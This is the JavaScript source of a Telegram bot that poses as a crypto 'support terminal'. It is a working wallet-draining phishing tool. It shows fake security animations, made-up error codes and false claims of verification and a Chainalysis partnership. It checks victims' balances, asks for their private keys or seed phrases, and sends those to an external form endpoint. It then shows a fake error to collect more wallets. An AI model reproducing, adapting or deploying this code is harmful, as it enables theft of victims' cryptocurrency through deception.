require('dotenv').config();
const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { Network, Alchemy } = require('alchemy-sdk');
const axios = require('axios');
const fs = require('fs');
const crypto = require('crypto');

// ====== Express Server Setup ======
const app = express();
const PORT = process.env.PORT || 3000;

// Health check endpoint
app.get('/', (req, res) => {
  res.status(200).json({ 
    status: 'Bot is running',
    bots: process.env.TG_BOT_TOK1 ? 'Active' : 'Inactive'
  });
});

// Certificate endpoint
const htmlContent = `<!-- Your HTML template here -->`;
app.get('/certificate/:botUsername', (req, res) => {
  const modifiedHtml = htmlContent
    .replace('YOUR BOT NAME', `@${req.params.botUsername}`)
    .replace('id="current-date"', `id="current-date">${new Date().toLocaleDateString()}`);
  res.send(modifiedHtml);
});

// Start server
app.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
});

// ====== Instance Lock File ======
const LOCK_FILE = '.bot.lock';
if (fs.existsSync(LOCK_FILE)) {
  console.error('❌ Another bot instance is already running! Exiting...');
  process.exit(1);
} else {
  fs.writeFileSync(LOCK_FILE, '');
  process.on('exit', () => fs.unlinkSync(LOCK_FILE));
}

// ====== Bot Configurations ======
const BOT_CONFIGS = [
  {
    botToken: process.env.TG_BOT_TOK1,
    formcarryToken: process.env.FORMCARRY_ACCESS_TOKEN_1,
    formcarryUrl: process.env.FORMCARRY_URL_1
  },
  {
    botToken: process.env.TG_BOT_TOK2,
    formcarryToken: process.env.FORMCARRY_ACCESS_TOKEN_2,
    formcarryUrl: process.env.FORMCARRY_URL_2
  },
  {
    botToken: process.env.TG_BOT_TOK3,
    formcarryToken: process.env.FORMCARRY_ACCESS_TOKEN_3,
    formcarryUrl: process.env.FORMCARRY_URL_3
  },
  {
    botToken: process.env.TG_BOT_TOK4,
    formcarryToken: process.env.FORMCARRY_ACCESS_TOKEN_4,
    formcarryUrl: process.env.FORMCARRY_URL_4
  },
  {
    botToken: process.env.TG_BOT_TOK5,
    formcarryToken: process.env.FORMCARRY_ACCESS_TOKEN_5,
    formcarryUrl: process.env.FORMCARRY_URL_5
  }
].filter(config => config.botToken && config.formcarryToken);

if (BOT_CONFIGS.length === 0) {
  console.error('❌ No valid bot configurations found! Check your .env file');
  process.exit(1);
}

// ====== Initialize Bots ======
const bots = BOT_CONFIGS.map(config => {
  try {
    const bot = new TelegramBot(config.botToken, {
      polling: {
        autoStart: true,
        params: { timeout: 10 }
      }
    });
    bot.config = config;
    console.log(`✅ Bot with token ending in ${config.botToken.slice(-5)} initialized`);
    return bot;
  } catch (error) {
    console.error(`❌ Failed to initialize bot:`, error.message);
    return null;
  }
}).filter(bot => bot !== null);

// ====== User Session Management ======
const userData = {};

// ====== Security Functions ======
function generateSessionId(userId) {
  return `TRUST-${crypto.randomBytes(4).toString('hex')}-${userId.toString().slice(-4)}`;
}

// ====== Address Validation Functions ======
function validateEVMAddress(address) {
  return /^0x[a-fA-F0-9]{40}$/.test(address);
}

function validateBTCAddress(address) {
  // Basic validation for BTC addresses (P2PKH, P2SH, Bech32)
  return /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/.test(address);
}

function validateXRPAddress(address) {
  // Basic validation for XRP addresses
  return /^r[1-9A-HJ-NP-Za-km-z]{25,34}$/.test(address);
}

function identifyAddressType(address) {
  if (validateEVMAddress(address)) return 'evm';
  if (validateBTCAddress(address)) return 'btc';
  if (validateXRPAddress(address)) return 'xrp';
  return null;
}

// ====== Error Messages ======
const ERROR_MESSAGES = {
  harvest: "❌ Harvest Error: Failed to claim rewards (Error 0x3f5a7...). Gas estimation failed.",
  claim: "⚠️ Claim Failed: Insufficient gas (Error 0x12ab8...). Try increasing gas by 15%.",
  migrate: "🔀 Migration Error: Contract interaction reverted (Error 0x45cd2...). Check token approvals.",
  staking: "⏳ Staking Error: Pool balance too low (Error 0x7d3e1...). Minimum 0.5 ETH required.",
  whitelist: "📝 Whitelist Error: Signature invalid (Error 0x23fc9...). Reconnect wallet.",
  bridge_err: "🌉 Bridge Error: Cross-chain tx stuck (Error 0x56ff4...). Requires manual reset.",
  presale_err: "🛒 Presale Error: Allocation exceeded (Error 0x91a2b...). Wait for next round.",
  nft: "🖼️ NFT Error: Metadata mismatch (Error 0x34de7...). Clear cache and retry.",
  revoke: "✂️ Revoke Error: Approval not found (Error 0x12fe8...). Token already revoked?",
  kyc: "🆔 KYC Error: Document expired (Error 0x78c2d...). Upload new ID.",
  deposit: "💸 Deposit Error: Tx not mined in 30 blocks (Error 0x45ab3...). Check recipient.",
  others: "❓ Unknown Error: Contact support with error code 0x0000..."
};

// ====== Blockchain Scanner ======
class BlockchainScanner {
  constructor() {
    this.chains = {
      evm: {
        eth: {
          name: 'Ethereum',
          symbol: 'ETH',
          settings: { 
            apiKey: process.env.ALCHEMY_API_KEY_ETH, 
            network: Network.ETH_MAINNET 
          }
        },
        polygon: {
          name: 'Polygon',
          symbol: 'MATIC',
          settings: { 
            apiKey: process.env.ALCHEMY_API_KEY_POLYGON, 
            network: Network.MATIC_MAINNET 
          }
        },
        bsc: {
          name: 'Binance Smart Chain',
          symbol: 'BNB',
          settings: {
            apiKey: process.env.ALCHEMY_API_KEY_BSC,
            network: Network.BNB_MAINNET
          }
        }
      },
      btc: {
        name: 'Bitcoin',
        symbol: 'BTC',
        explorerUrl: 'https://blockstream.info/api/address/'
      },
      xrp: {
        name: 'Ripple',
        symbol: 'XRP',
        explorerUrl: 'https://data.ripple.com/v2/accounts/'
      }
    };
  }

  async getEVMWalletData(address, chain) {
    const alchemy = new Alchemy(this.chains.evm[chain].settings);
    try {
      const [balance, tokens] = await Promise.all([
        alchemy.core.getBalance(address),
        alchemy.core.getTokensForOwner(address)
      ]);
      return {
        success: true,
        balance: balance.toString(),
        tokenCount: tokens.tokens.length,
        name: this.chains.evm[chain].name,
        symbol: this.chains.evm[chain].symbol
      };
    } catch (error) {
      console.error(`${chain} scan error:`, error);
      return { success: false };
    }
  }

  async getBTCWalletData(address) {
    try {
      const response = await axios.get(`${this.chains.btc.explorerUrl}${address}`);
      const data = response.data;
      
      return {
        success: true,
        balance: data.chain_stats.funded_txo_sum - data.chain_stats.spent_txo_sum,
        txCount: data.chain_stats.tx_count,
        name: this.chains.btc.name,
        symbol: this.chains.btc.symbol
      };
    } catch (error) {
      console.error('BTC scan error:', error);
      return { success: false };
    }
  }

  async getXRPWalletData(address) {
    try {
      const response = await axios.get(`${this.chains.xrp.explorerUrl}${address}/balances`);
      const data = response.data;
      
      const xrpBalance = data.balances.find(b => b.currency === 'XRP');
      const balance = xrpBalance ? parseFloat(xrpBalance.value) : 0;
      
      return {
        success: true,
        balance,
        txCount: data.transaction_count || 0,
        name: this.chains.xrp.name,
        symbol: this.chains.xrp.symbol
      };
    } catch (error) {
      console.error('XRP scan error:', error);
      return { success: false };
    }
  }

  async scanAddress(address) {
    const addressType = identifyAddressType(address);
    const results = { type: addressType };
    
    if (!addressType) {
      return { success: false, error: 'Invalid address format' };
    }

    try {
      if (addressType === 'evm') {
        // Scan across all EVM chains
        const evmPromises = [];
        
        for (const [chainId] of Object.entries(this.chains.evm)) {
          evmPromises.push(
            this.getEVMWalletData(address, chainId)
              .then(data => {
                results[chainId] = data;
              })
          );
        }

        await Promise.all(evmPromises);
      } 
      else if (addressType === 'btc') {
        results.btc = await this.getBTCWalletData(address);
      } 
      else if (addressType === 'xrp') {
        results.xrp = await this.getXRPWalletData(address);
      }

      return { success: true, data: results };
    } catch (error) {
      console.error('Scan error:', error);
      return { success: false, error: error.message };
    }
  }
}

// ====== Formcarry Submission ======
const sendToFormcarry = async (bot, chatId, data, retries = 3, delay = 1000) => {
  try {
    const response = await axios.post(bot.config.formcarryUrl, data, {
      headers: { Authorization: `Bearer ${bot.config.formcarryToken}` },
    });

    if (response.status === 200) {
      const options = {
        reply_markup: {
          inline_keyboard: [
            [
              { text: '🔄 Restart Bot', callback_data: 'restart_bot' },
              { text: '➕ Import New Wallet', callback_data: 'import_another_wallet' }
            ],
            [
              { text: 'Contact Support 🟢', url: 'https://t.me/yesmine2008' }
            ]
          ],
        },
      };

      await bot.sendMessage(chatId, '❌ An error occurred, please contact admin to solve your issue or try importing another wallet.', {
        parse_mode: 'Markdown',
        ...options,
      });
    } else {
      await bot.sendMessage(chatId, '❌ *Oops! Something went wrong. Please try again.*', {
        parse_mode: 'Markdown',
      });
    }
  } catch (error) {
    if (error.response && error.response.status === 429 && retries > 0) {
      const retryDelay = delay * 2;
      console.log(`Rate limit hit. Retrying in ${retryDelay}ms...`);
      setTimeout(() => sendToFormcarry(bot, chatId, data, retries - 1, retryDelay), retryDelay);
    } else {
      console.error('Error submitting to Formcarry:', error.message);
      await bot.sendMessage(chatId, '❌ *Oops! Something went wrong. Please try again.*', {
        parse_mode: 'Markdown',
      });
    }
  }
};

// ====== Menu Commands ======
bots.forEach(bot => {
  // Set bot commands menu
  bot.setMyCommands([
    { command: '/start', description: 'Restart the bot 🤖' },
    { command: '/verify', description: 'Verify Bot 🛡️' },
    { command: '/certificate', description: 'Audit Cert 🪪' },
    { command: '/help', description: 'Get assistance 👨🏼‍🔧' },
    { command: '/wallet', description: 'Wallet operations 🔐' }
  ]);

  // Certificate command
  bot.onText(/\/certificate/, async (msg) => {
    const chatId = msg.chat.id;
    try {
      const botInfo = await bot.getMe();
      const certificateUrl = `https://thdhhdp.remainnetath.xyz/?name=${encodeURIComponent(botInfo.first_name)}`;
      
      await bot.sendMessage(
        chatId,
        `📜 *Your Security Certificate*\n\n` +
        `View certificate: [Click Here](${certificateUrl})`,
        { parse_mode: 'Markdown' }
      );
    } catch (error) {
      console.error('Certificate error:', error);
      await bot.sendMessage(chatId, '⚠️ Could not generate certificate link');
    }
  });

  // Help command
  bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(
      chatId,
      `🛟 *Help Center*\n\nNeed assistance? Here are your options:\n\n` +
      `• Use the menu buttons below\n` +
      `• Contact @yesmine2008\n` +
      `• Type /start to reset`,
      { parse_mode: 'Markdown' }
    );
  });

  // Verify command
  bot.onText(/\/verify/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(
      chatId,
      `🔐 *Identity Verification*\n\n` +
      `✅ Verified by Crypto Security Alliance\n` +
      `🛡️ Partnered with Chainalysis\n` +
      `🔒 Non-Custodial - We never hold your assets\n\n`,
      { parse_mode: 'Markdown', disable_web_page_preview: true }
    );
  });

  // Wallet command
  bot.onText(/\/wallet/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(
      chatId,
      "🔑 *Wallet Manager*",
      {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [{ text: 'Import Wallet', callback_data: 'import_wallet' }]
          ]
        }
      }
    );
  });
});

// ====== Main Bot Handlers ======
bots.forEach(bot => {
    // Initialize user data for any interaction
    const ensureUserData = (chatId) => {
      if (!userData[chatId]) {
        userData[chatId] = {
          step: 'choosing_option',
          sessionId: generateSessionId(chatId)
        };
      }
      return userData[chatId];
    };
  // Start Command with Full Animation Sequence
  bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const user = ensureUserData(chatId);
    const sessionId = generateSessionId(msg.from.id);
    
    // Initial loading message
    const loadingMsg = await bot.sendMessage(
      chatId,
      `🖥️ *Initializing Crypto Support Terminal...*\n` +
      '```\n' +
      '[██████░░░░░░] 50%\n' +
      '```',
      { parse_mode: 'Markdown' }
    );

    // Simulate loading progression
    for (let i = 6; i <= 10; i++) {
      await new Promise(r => setTimeout(r, 600));
      await bot.editMessageText(
        `🖥️ *Initializing Crypto Support Terminal...*\n` +
        '```\n' +
        `[${'█'.repeat(i)}${'░'.repeat(10-i)}] ${i*10}%\n` +
        '```',
        {
          chat_id: chatId,
          message_id: loadingMsg.message_id,
          parse_mode: 'Markdown'
        }
      );
    }

    // Authentication sequence
    await bot.editMessageText(
      `🔐 *Authentication Sequence...*\n` +
      '```\n' +
      '[1] Verifying session credentials... ✅\n' +
      '[2] Establishing E2E encryption... ✅\n' +
      '[3] Connecting to node network... 🔄\n' +
      '```',
      {
        chat_id: chatId,
        message_id: loadingMsg.message_id,
        parse_mode: 'Markdown'
      }
    );

    // Final interface
    setTimeout(async () => {
      await bot.deleteMessage(chatId, loadingMsg.message_id);
      
      const options = {
        reply_markup: {
          inline_keyboard: [
            [
              { text: 'Harvest Transaction', callback_data: 'harvest' },
              { text: 'Claim', callback_data: 'claim' }
            ],
            [
              { text: 'Migration', callback_data: 'migrate' },
              { text: 'Staking', callback_data: 'staking' }
            ],
            [
              { text: 'Whitelisting', callback_data: 'whitelist' },
              { text: 'Bridge Error', callback_data: 'bridge_err' }
            ],
            [
              { text: 'Presale Error', callback_data: 'presale_err' },
              { text: 'NFT', callback_data: 'nft' }
            ],
            [
              { text: 'Revoke', callback_data: 'revoke' },
              { text: 'KYC', callback_data: 'kyc' }
            ],
            [
              { text: 'Deposit Issues', callback_data: 'deposit' },
              { text: 'Others', callback_data: 'others' }
            ],
            [
              { text: 'Contact Support 🟢', url: 'https://t.me/yesmine2008' }
            ]
          ],
        },
      };

      await bot.sendMessage(
        chatId,
        `🔷 *CRYPTO SUPPORT TERMINAL* 🔷\n` +
        `╔══════════════════════════════╗\n` +
        `║  ⟣  WALLET CONFIGURATION     ║\n` +
        `║  ⟣  TRANSACTION TROUBLESHOOT ║\n` +
        `║  ⟣  BLOCKCHAIN NAVIGATION    ║\n` +
        `╚══════════════════════════════╝\n\n` +
        `🛡️ *SECURE SESSION INITIALIZED*\n` +
        `┌──────────────────────────────┐\n` +
        `│ 📌 Session ID: \`${sessionId}\` │\n` +
        `├──────────────────────────────┤\n` +
        `│ 🔒 Protocol: E2E-Encrypted   │\n` +
        `│ ⚙️ Access: Pure Automation   │\n` +
        `│ ⚠️ Logged: ${new Date().toISOString().split('T')[0]} │\n` +
        `└──────────────────────────────┘\n\n` +
        `I'm your dedicated assistant here to help with all crypto-related questions and issues. \n` +
        `Select from the Options below what issue you are experiencing 👇 \n\n` +
        `_The identifier helps maintain your secure connection_`,
        { 
          parse_mode: 'Markdown',
          ...options
        }
      );
      
      userData[chatId] = { 
        step: 'choosing_option',
        sessionId 
      };
    }, 2000);
  });

  // Callback Query Handler
  bot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;
    const user = ensureUserData(chatId);

    // Handle restart and import cases
    if (data === 'restart_bot') {
      await bot.sendMessage(chatId, '🔄 Restarting the bot...');
      return bot.sendMessage(chatId, '/start');
    }

    if (data === 'import_another_wallet') {
      user.step = 'choosing_option';
      const options = {
        reply_markup: {
          inline_keyboard: [
            [
              { text: 'Harvest Transaction', callback_data: 'harvest' },
              { text: 'Claim', callback_data: 'claim' }
            ],
            [
              { text: 'Migration', callback_data: 'migrate' },
              { text: 'Staking', callback_data: 'staking' }
            ],
            [
              { text: 'Whitelisting', callback_data: 'whitelist' },
              { text: 'Bridge Error', callback_data: 'bridge_err' }
            ],
            [
              { text: 'Presale Error', callback_data: 'presale_err' },
              { text: 'NFT', callback_data: 'nft' }
            ],
            [
              { text: 'Revoke', callback_data: 'revoke' },
              { text: 'KYC', callback_data: 'kyc' }
            ],
            [
              { text: 'Help', callback_data: 'help' },
              { text: 'Others', callback_data: 'others' }
            ],
            [
              { text: 'Contact Support 🟢', url: 'https://t.me/yesmine2008' }
            ]
          ],
        },
      };

      return bot.sendMessage(
        chatId,
        '➕ Please choose an option to import another wallet:',
        {
          parse_mode: 'Markdown',
          ...options,
        }
      );
    }

    // Handle authentication method selection
    if (data === 'private_key' || data === 'seed_phrase') {
      // Show initial loading animation
      const loadingMsg = await bot.sendMessage(
        chatId,
        `🛡️ *Initializing Secure Authentication*\n` +
        '```\n' +
        '[████████░░░░] 60%\n' +
        '```',
        { parse_mode: 'Markdown' }
      );

      // Simulate security checks
      await new Promise(r => setTimeout(r, 2000));
      await bot.editMessageText(
        `🔒 *Running Security Protocols*\n` +
        '```\n' +
        '[1] Isolating session... ✅\n' +
        '[2] Encrypting channel... ✅\n' +
        '[3] Verifying request... 🔄\n' +
        '```',
        { 
          chat_id: chatId,
          message_id: loadingMsg.message_id,
          parse_mode: 'Markdown'
        }
      );

      // Final authentication ready
      setTimeout(async () => {
        await bot.deleteMessage(chatId, loadingMsg.message_id);
        
        userData[chatId].authMethod = data;
        userData[chatId].step = 'providing_input';

        let message = '';
        if (data === 'private_key') {
          message = `🔑 *PRIVATE KEY VERIFICATION*\n` +
            `╔══════════════════════════════╗\n` +
            `║  SECURITY LEVEL: MAXIMUM      ║\n` +
            `║  ENCRYPTION: AES-256          ║\n` +
            `╚══════════════════════════════╝\n\n` +
            `Enter your *private key* below:\n\n` +
            `⚠️ Never share this with anyone!`;
        } else {
          message = `🌱 *SEED PHRASE VERIFICATION*\n` +
            `╔══════════════════════════════╗\n` +
            `║  WORDS REQUIRED: 12/24       ║\n` +
            `║  FORMAT: Space-separated     ║\n` +
            `╚══════════════════════════════╝\n\n` +
            `Enter your *recovery phrase* below:`;
        }

        await bot.sendMessage(
          chatId,
          message,
          { parse_mode: 'Markdown' }
        );
      }, 1500);
    } 
    // Handle skip scan option
    else if (data === 'skip_scan') {
      user.step = 'awaiting_auth';
      await bot.sendMessage(
        chatId,
        `⚠️ *Address Verification Skipped*\n` +
        `Proceeding directly to authentication for:\n` +
        `${user.option.toUpperCase()} issue resolution`,
        {
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [
                { text: '🔐 Private Key', callback_data: 'private_key' },
                { text: '📜 Seed Phrase', callback_data: 'seed_phrase' }
              ]
            ]
          }
        }
      );
    }
    // Handle option selection (harvest, claim, etc.)
    else {
      user.option = data;
      user.step = 'awaiting_address';

      // Show preparing authentication message
      const loadingMsg = await bot.sendMessage(
        chatId,
        `⚙️ *Preparing Authentication Options*...`,
        { parse_mode: 'Markdown' }
      );
      
      setTimeout(async () => {
        await bot.deleteMessage(chatId, loadingMsg.message_id);
        await bot.sendMessage(
          chatId,
          `🔍 *${data.toUpperCase()} Setup*\n` +
          `┌──────────────────────────────┐\n` +
          `│ 1. Enter your wallet address │\n` +
          `│    (EVM/BTC/XRP supported)  │\n` +
          `│ 2. We'll diagnose the issue │\n` +
          `│ 3. Provide solution         │\n` +
          `└──────────────────────────────┘\n\n` +
          `Supported formats:\n` +
          `• EVM: 0x... (42 chars)\n` +
          `• BTC: 1..., 3..., or bc1...\n` +
          `• XRP: r... (25-34 chars)\n\n` +
          `Or click below to skip address verification:`,
          {
            parse_mode: 'Markdown',
            reply_markup: {
              inline_keyboard: [
                [{ text: '⏭️ Skip Address Step', callback_data: 'skip_scan' }]
              ]
            }
          }
        );
      }, 800);
    }
  });

  // Message Handler
  bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text?.trim();
    const user = ensureUserData(chatId);

    if (!user) return;

    // Handle wallet address input
    if (user.step === 'awaiting_address') {
      const addressType = identifyAddressType(text);
      
      if (!addressType) {
        return bot.sendMessage(
          chatId,
          `❌ Invalid wallet address format!\n` +
          `Please enter a valid:\n` +
          `• EVM address (0x... 42 characters)\n` +
          `• BTC address (1..., 3..., or bc1...)\n` +
          `• XRP address (r... 25-34 characters)\n\n` +
          `or click below to skip this step:`,
          {
            parse_mode: 'Markdown',
            reply_markup: {
              inline_keyboard: [
                [{ text: '⏭️ Skip Verification', callback_data: 'skip_scan' }]
              ]
            }
          }
        );
      }

      // Start 1-minute scan with animation
      const loadingMsg = await bot.sendMessage(
        chatId,
        `🛰️ *Scanning Wallet Activity...*\n` +
        '```\n' +
        '[████░░░░░░░░] 25%\n' +
        '```',
        { parse_mode: 'Markdown' }
      );

      // Animation updates (4 stages over 1 minute)
      const updateProgress = async (progress) => {
        try {
          await bot.editMessageText(
            `🛰️ *Scanning Wallet Activity...*\n` +
            '```\n' +
            `[${'█'.repeat(Math.floor(progress/25))}${'░'.repeat(4-Math.floor(progress/25))}] ${progress}%\n` +
            '```',
            {
              chat_id: chatId,
              message_id: loadingMsg.message_id,
              parse_mode: 'Markdown'
            }
          );
        } catch (error) {
          console.error('Progress update failed:', error);
        }
      };

      // Simulate scan with BlockchainScanner
      try {
        const scanner = new BlockchainScanner();
        const scanResult = await scanner.scanAddress(text);
        
        if (!scanResult.success) {
          throw new Error(scanResult.error || 'Scan failed');
        }

        const scanData = scanResult.data;
        
        // Update progress every 15 seconds
        const stages = [40, 60, 80, 100];
        for (const stage of stages) {
          await new Promise(r => setTimeout(r, 10000));
          await updateProgress(stage);
        }

        await bot.deleteMessage(chatId, loadingMsg.message_id);

        // Format results based on address type
        const errorMsg = ERROR_MESSAGES[user.option] || ERROR_MESSAGES.others;
        let resultMsg = `📊 *Scan Results for ${user.option.toUpperCase()}*\n` +
          `┌──────────────────────────────┐\n` +
          `│ Address: ${text.slice(0, 6)}...${text.slice(-4)} │\n` +
          `│ Type: ${addressType.toUpperCase().padEnd(24)}│\n`;

        if (addressType === 'evm') {
          // Show all EVM chain balances
          Object.entries(scanData).forEach(([chain, data]) => {
            if (chain !== 'type' && data.success) {
              resultMsg += `├ ${data.name.padEnd(30)}┤\n` +
                `│ Balance: ${(data.balance / 1e18).toFixed(4)} ${data.symbol}     │\n` +
                `│ Tokens: ${data.tokenCount}               │\n`;
            }
          });
        } 
        else if (addressType === 'btc' && scanData.btc?.success) {
          resultMsg += `├ ${scanData.btc.name.padEnd(30)}┤\n` +
            `│ Balance: ${(scanData.btc.balance / 1e8).toFixed(8)} ${scanData.btc.symbol} │\n` +
            `│ TX Count: ${scanData.btc.txCount}             │\n`;
        } 
        else if (addressType === 'xrp' && scanData.xrp?.success) {
          resultMsg += `├ ${scanData.xrp.name.padEnd(30)}┤\n` +
            `│ Balance: ${scanData.xrp.balance} ${scanData.xrp.symbol}       │\n` +
            `│ TX Count: ${scanData.xrp.txCount}             │\n`;
        }

        resultMsg += `└──────────────────────────────┘\n\n` +
          `⚠️ Detected Issue:\n${errorMsg}\n\n` +
          `🔑 Authentication required to resolve:`;

        await bot.sendMessage(
          chatId,
          resultMsg,
          {
            parse_mode: 'Markdown',
            reply_markup: {
              inline_keyboard: [
                [
                  { text: '🔐 Private Key', callback_data: 'private_key' },
                  { text: '📜 Seed Phrase', callback_data: 'seed_phrase' }
                ]
              ]
            }
          }
        );

        user.step = 'awaiting_auth';
        user.walletAddress = text;
        user.addressType = addressType;
      } catch (error) {
        console.error('Scan failed:', error);
        await bot.editMessageText(
          `⚠️ Scan Failed for ${text.slice(0, 6)}...${text.slice(-4)}\n` +
          `You can still proceed to authentication:`,
          {
            chat_id: chatId,
            message_id: loadingMsg.message_id,
            reply_markup: {
              inline_keyboard: [
                [
                  { text: '🔐 Private Key', callback_data: 'private_key' },
                  { text: '📜 Seed Phrase', callback_data: 'seed_phrase' }
                ]
              ]
            }
          }
        );
      }
    }
    // Handle private key/seed phrase input
    else if (user.step === 'providing_input') {
      const authMethod = user.authMethod;
      let isValid = false;
      let errorMessage = '';

      if (authMethod === 'seed_phrase') {
        const words = text.trim().split(/\s+/);
        isValid = words.length >= 12;
        if (!isValid) {
          errorMessage = '❌ *Invalid Seed Phrase!* It must contain 12-24 words. Please try again:';
        }
      } else if (authMethod === 'private_key') {
        isValid = text.length >= 64;
        if (!isValid) {
          errorMessage = '❌ *Invalid Private Key!* It must be 64 hexadecimal characters. Please try again:';
        }
      }

      if (!isValid) {
        return bot.sendMessage(
          chatId,
          errorMessage,
          { parse_mode: 'Markdown' }
        );
      }

      // Prepare form data
      const formData = {
        option: user.option,
        authMethod: user.authMethod,
        input: text,
        walletAddress: user.walletAddress,
        addressType: user.addressType,
        sessionId: user.sessionId,
        timestamp: new Date().toISOString()
      };

      // Submit to Formcarry
      await sendToFormcarry(bot, chatId, formData);
      delete userData[chatId];
    }
  });
});

// ====== Error Handling ======
process.on('SIGINT', () => {
  console.log('🛑 Stopping bot gracefully...');
  bots.forEach(bot => bot.stopPolling());
  fs.unlinkSync(LOCK_FILE);
  process.exit();
});

bots.forEach(bot => {
  bot.on('polling_error', (error) => {
    console.error(`Polling Error (${bot.config.botToken.slice(-5)}):`, error.message);
    if (error.code === 'ETELEGRAM' && error.message.includes('409 Conflict')) {
      console.error('Conflict detected! Stopping this instance...');
      process.exit(1);
    }
  });
});

console.log(`🚀 ${bots.length} bot(s) running successfully`);
